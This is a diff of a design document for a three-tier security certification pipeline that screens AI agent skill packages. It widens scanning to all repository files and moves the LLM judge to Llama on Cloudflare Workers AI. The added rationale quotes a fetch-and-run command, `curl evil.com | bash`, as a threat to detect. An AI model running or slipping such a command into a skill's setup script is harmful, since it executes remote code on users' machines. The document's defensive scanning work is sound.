@@ -1,7 +1,7 @@
 # Three-Tier Certification System Design
 
 **Status**: DRAFT
-**Authors**: SpecWeave Architecture Team
+**Author**: anton.abyzov@gmail.com
 **Date**: 2026-02-15
 **Satisfies**: AC-US4-02 (T-008)
 **Downstream Dependencies**: T-009, T-013, T-015, T-015b, T-015c, T-024, T-025, T-029, T-030, T-034, T-036, T-041
@@ -103,6 +103,27 @@ In addition to pattern scanning, Tier 1 performs structural checks:
 | No binary files | Yes | Reject |
 | File extensions whitelist (`.md`, `.ts`, `.js`, `.json`, `.yaml`, `.yml`, `.png`, `.svg`) | Yes | Warning |
 
+#### 2.2.4 Full Repository Scanning Scope
+
+Tier 1 scanning applies to ALL files in the skill repository, not just SKILL.md:
+
+| File Type | Scanned? | Patterns Applied |
+|-----------|----------|-----------------|
+| `SKILL.md` | Yes (primary) | All 37 patterns + structural checks |
+| `scripts/*.sh` | Yes | All 37 patterns (shell-focused) |
+| `scripts/*.py` | Yes | Python RCE patterns (subprocess, os.system) |
+| `scripts/*.ts`, `scripts/*.js` | Yes | All 37 patterns |
+| `hooks/` directory files | Yes | All 37 patterns |
+| `.json`, `.yaml`, `.yml` configs | Yes | Credential patterns only |
+| Binary files | No (rejected) | Structural check: no binary files |
+| Files > 100KB | No (flagged) | Warning: oversized file |
+
+**Scanning method**: Shallow clone (depth=1) of the submitted repository. All non-binary files co-located with or referenced by SKILL.md are included.
+
+**Limits**: Individual file max 100KB, total scan payload max 1MB per skill repository.
+
+**Rationale**: Snyk documented that `curl evil.com | bash` in `scripts/setup.sh` would pass a SKILL.md-only scanner. A skill with `scripts/` directory must have its scripts scanned at Tier 1, not just escalated to Tier 3.
+
 ### 2.3 Pass/Fail Criteria
 
 ```
@@ -139,7 +160,7 @@ Deep semantic analysis that catches obfuscation, behavioral mismatches, and soph
 ### 3.2 Prerequisites
 
 - Tier 1 must PASS before Tier 2 runs
-- Requires LLM API access (Anthropic Claude, with external API consent per project policy)
+- Requires Cloudflare Workers AI access (`@cf/meta/llama-3.1-70b-instruct` via `env.AI` binding)
 
 ### 3.3 LLM Judge Analysis
 
@@ -246,7 +267,7 @@ interface Tier2Result {
   concerns: string[];
   recommendations: string[];
   domainChecks: DomainCheck[];
-  model: string;           // e.g., 'claude-sonnet-4-5-20250929'
+  model: string;           // e.g., '@cf/meta/llama-3.1-70b-instruct'
   scanDuration_ms: number;
   tier1Result: Tier1Result; // Reference to upstream result
 }
@@ -254,10 +275,12 @@ interface Tier2Result {
 
 ### 3.5 Performance Target
 
-- **Latency**: 5-15 seconds per skill (LLM inference)
-- **Cost**: ~$0.01-0.05 per skill (Sonnet-class model, ~2K input + 1K output tokens)
-- **Throughput**: 200-500 skills/hour (API rate limited)
-- **Model**: Claude Sonnet 4.5 (cost-effective for volume) with Opus 4.6 for escalation
+- **Latency**: 5-15 seconds per skill (Workers AI inference)
+- **Cost**: ~$0.003 per skill (Llama 3.1 70B, ~2K input + 1K output tokens at $0.293/M input, $2.253/M output)
+- **Throughput**: ~300 req/min (Workers AI rate limit for text generation)
+- **Model**: `@cf/meta/llama-3.1-70b-instruct` on Cloudflare Workers AI (serverless, no GPU management)
+- **Free tier**: ~10,000 neurons/day (sufficient for <~100 scans/day)
+- **At scale (500/day)**: ~$1.50/day = ~$45/month
 
 ---
 
@@ -343,7 +366,7 @@ CHANGES:   Reviewer requests modifications → Author resubmits (re-enters at Ti
 ### 4.5 Performance Target
 
 - **Latency**: 1-5 business days per skill
-- **Cost**: $50-200 per skill (human reviewer time)
+- **Cost**: Free (community volunteer reviewers)
 - **Throughput**: 5-20 skills/week per reviewer
 - **Validity**: 6 months (re-certification required on expiry or major version bump)
 
@@ -421,7 +444,7 @@ All skills that pass Tier 1 automatically proceed to Tier 2 if:
 |-----------|---------|--------|
 | Score 60-79 | Tier 2 CONCERNS verdict | Auto-escalate to Tier 3 review queue |
 | High-privilege skill | Skill requests `Bash(*)` or `Write` to system dirs | Auto-escalate |
-| Scripts directory | Skill includes `scripts/` with executable files | Auto-escalate |
+| Scripts directory | Skill includes `scripts/` with executable files | Scan all scripts at Tier 1 + auto-escalate to Tier 3 |
 | Network-accessing skill | Skill declares network access in permissions | Auto-escalate |
 | Author request | Author explicitly submits for Tier 3 | Escalate |
 
@@ -523,8 +546,8 @@ interface CertificationRecord {
 | Tier | Cost per Skill | Latency | False Negative Rate | False Positive Rate | Catches |
 |------|---------------|---------|--------------------|--------------------|---------|
 | **Tier 1** | $0 | <500ms | ~40% (Snyk estimate) | ~5% (safe context handling) | Obvious patterns, structural issues |
-| **Tier 2** | $0.01-0.05 | 5-15s | ~10-20% | ~3% (LLM context understanding) | Obfuscation, behavioral mismatch, social engineering |
-| **Tier 3** | $50-200 | 1-5 days | ~1-5% | ~1% (human judgment) | Sophisticated targeted attacks, subtle logic bombs |
+| **Tier 2** | ~$0.003 | 5-15s | ~10-20% | ~3% (LLM context understanding) | Obfuscation, behavioral mismatch, social engineering |
+| **Tier 3** | Free (volunteer) | 1-5 days | ~1-5% | ~1% (human judgment) | Sophisticated targeted attacks, subtle logic bombs |
 
 **Combined three-tier false negative rate**: ~1-5% (multiplicative reduction across tiers)
 
